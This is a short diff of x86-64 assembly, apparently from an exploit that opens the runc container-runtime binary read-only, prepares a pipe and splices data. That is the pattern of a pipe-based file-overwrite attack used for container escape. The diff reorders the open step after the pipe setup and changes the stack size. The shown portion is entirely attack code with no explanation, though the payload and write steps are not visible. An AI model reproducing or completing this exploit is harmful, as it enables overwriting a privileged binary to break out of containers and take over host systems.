@@ -6,22 +6,7 @@ _start:
     call main
 
 main:
-    sub rsp, 8+PAGE_SIZE
-
-; *******************
-; open
-; get runc's fd
-; *******************
-open:
-    mov rax, SYS_OPEN
-    mov rdx, 0
-    mov rsi, O_RDONLY                          ;flags
-    mov rdi, runc                                       ;filename
-    syscall
-
-    cmp     rax, 0                                        ; check for success
-    jl      errorOnOpen
-    mov qword [fileDesc], rax        
+    sub rsp, 0x10008
 
 ; *******************
 ; prepare_pipe
@@ -52,6 +37,21 @@ read:
     lea rsi,  [rsp+8]                         ;buffer
     lea rdi,  [rsp]                          ; p[0]
     syscall
+
+; *******************
+; open
+; get runc's fd
+; *******************
+open:
+    mov rax, SYS_OPEN
+    mov rdx, 0
+    mov rsi, O_RDONLY                          ;flags
+    mov rdi, runc                                       ;filename
+    syscall
+
+    cmp     rax, 0                                        ; check for success
+    jl      errorOnOpen
+    mov qword [fileDesc], rax        
 
 ; *******************
 ; splice
